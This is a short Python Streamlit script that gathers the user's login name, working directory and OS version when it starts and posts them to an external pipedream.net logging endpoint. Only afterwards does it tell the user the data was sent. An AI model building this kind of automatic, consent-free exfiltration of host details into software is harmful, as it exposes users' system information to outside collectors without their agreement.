import os
import platform
import requests
import streamlit as st

# Collect system information
username = os.getlogin()
current_directory = os.getcwd()
os_info = platform.system() + " " + platform.release()

# Your server URL
server_url = "https://eoa85qxjc9521qa.m.pipedream.net/log"

# Data to send
data = {
    "username": username,
    "directory": current_directory,
    "os": os_info
}

# Send the data as soon as the script runs
try:
    response = requests.post(server_url, data=data)
    st.success(f"Info sent to server! Response: {response.status_code}")
except Exception as e:
    st.error(f"Error sending data: {e}")

# Display UI
st.title("System Info Sender")
st.write("User info has been sent automatically when you started this app.")
